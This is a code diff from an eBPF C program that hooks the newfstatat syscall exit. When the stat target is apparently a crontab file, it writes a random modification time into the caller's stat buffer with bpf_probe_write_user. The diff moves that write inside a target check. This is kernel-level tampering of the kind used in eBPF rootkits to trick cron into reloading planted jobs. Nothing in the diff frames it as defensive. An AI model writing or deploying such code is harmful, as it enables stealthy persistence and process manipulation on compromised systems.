@@ -165,18 +165,20 @@ static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long re
 		bpf_printk("yes,target! method:fstat\n");
 	}
 	
-	
-	struct stat *statbuf_ptr=PT_REGS_PARM3_CORE(regs);
+	if(thisistarget)
+	{
+		struct stat *statbuf_ptr=PT_REGS_PARM3_CORE(regs);
 
-	bpf_printk("exit_newfstatat %s:%d\n",buf,pid);
+		bpf_printk("exit_newfstatat %s:%d\n",buf,pid);
 
-    __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+		__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
 
 
-	//bpf_probe_read_user((void*)&statbufobj,sizeof(statbufobj), PT_REGS_PARM3_CORE(regs) );
-	//bpf_printk("target statbuf.st_size:%ld\n",statbuf.st_size);
-	bpf_printk("Time MaGic +1s!\n");
-	bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
+		//bpf_probe_read_user((void*)&statbufobj,sizeof(statbufobj), PT_REGS_PARM3_CORE(regs) );
+		//bpf_printk("target statbuf.st_size:%ld\n",statbuf.st_size);
+		bpf_printk("Time MaGic +1s!\n");
+		bpf_probe_write_user(&(statbuf_ptr->st_mtime), &crontab_st_mtime, sizeof(crontab_st_mtime));
+	}
 
 }
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
